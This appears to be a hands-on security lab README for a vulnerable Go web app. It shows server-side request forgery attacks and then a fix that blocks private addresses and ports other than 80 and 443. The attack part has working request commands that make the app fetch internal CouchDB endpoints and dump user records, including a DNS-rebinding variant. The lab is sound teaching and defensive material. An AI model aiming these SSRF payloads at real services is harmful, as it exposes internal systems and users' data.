# Go - SSRF Attack and Defense

## Instructions

> Let's first attack the vulnerable Server-Side Request Forgery Vulnerability in our Go application

### Setup Stack

```bash
cd go-ssrf-attack-defense/
```

```bash
./init-stack.sh
```

> This will spin up the mandatory database stack that we'll use to perform our attack

```bash
docker build -t ssrf-app .
```

> This will build our vulnerable SSRF app

```bash
docker run -p 8080:8080 -d --net=host ssrf-app
```

> This will run our vulnerable SSRF Web Application

### Attacking the SSRF Vulnerability

Now let's see if our application works as intended

```bash
http POST http://localhost:8080/check name=my-website url=http://httpbin.org/post
```

> This should return a response with the name and the base64 encoded content of the response from the URL
> You can base64 decode the content and you should find the response from the URL that you submitted.
> Let's try and exploit the SSRF service to access a local service

```bash
http POST http://localhost:8080/check name=my-website url=http://localhost:5984/_all_dbs
```

```bash
http POST http://localhost:8080/check name=my-website url=http://localhost:5984/users/_all_docs | jq -r .content | base64 -D
```

> You should see the user data in the response.

This attack could work extensively, even with DNS rebinding...

```bash
http POST http://localhost:8080/check name=my-website url=http://locally.cwedetails.com:5984/users/_all_docs | jq -r .content | base64 -D
```

All of these attacks confirm the possibility of performing SSRF attacks against the application.

Let's look at defense now...

### Defending against SSRF

First, copy the contents of `/root/go-ssrf-attack-defense/secure.txt` to `main.go` in the same directory

Let's look at the code....

One of the things we've done here is to write a "hook" to the http client library that we're making the URL request with

In Line 30, you should see `func secureSocketControl(network string, address string, conn syscall.RawConn) error {`

In this function we're doing the following:

* Checking if its TCP on IPv4 or IPv6 (line 31)
* Splitting the URL to host and port (line 35):
  * Check if Network Host is an IP address (this happens "post" DNS resolution, so this will always be an IP Address)
  * Check if the IP Addresses is a public IP Address. Private Addresses like 127.0.0.1, 10.x, 172.16.x are not allowed. This has been implemented in detail in `network.go`
  * Only allows if port is `80` or `443`. Any other port is not resolved

This prevents against:

* DNS Rebinding to a locally addressable IP address
* Non HTTP ports
* Invalid IP Addresses and protocols in TCP for both IPv4 and IPv6

All of this is being implemented in the function `requestHandler` where we're using a custom network client implementation for our HTTP client. This is exemplified in Line 76

```go
safeClient := &http.Client{
 Transport: safeTransport,
}
```

This ensures that our HTTP client is using the secure defaults to make HTTP requests and handle consequent responses.

Let's now attempt to perform SSRF against this more secure implementation

```bash
docker build -t ssrf-app .
```

> This will build our vulnerable SSRF app

```bash
docker run -p 8080:8080 -d --net=host ssrf-app
```

> This will run our vulnerable SSRF Web Application

Now let's see if our application works as intended

```bash
http POST http://localhost:8080/check name=my-website url=http://httpbin.org/post
```

> This should return a response with the name and the base64 encoded content of the response from the URL
> You can base64 decode the content and you should find the response from the URL that you submitted.
> Let's try and exploit the SSRF service to access a local service

```bash
http POST http://localhost:8080/check name=my-website url=http://localhost:5984/_all_dbs
```

> This should fail. Let's now try a DNS rebinding variant

```bash
http POST http://localhost:8080/check name=my-website url=http://locally.cwedetails.com:5984/users/_all_docs | jq -r .content | base64 -D
```
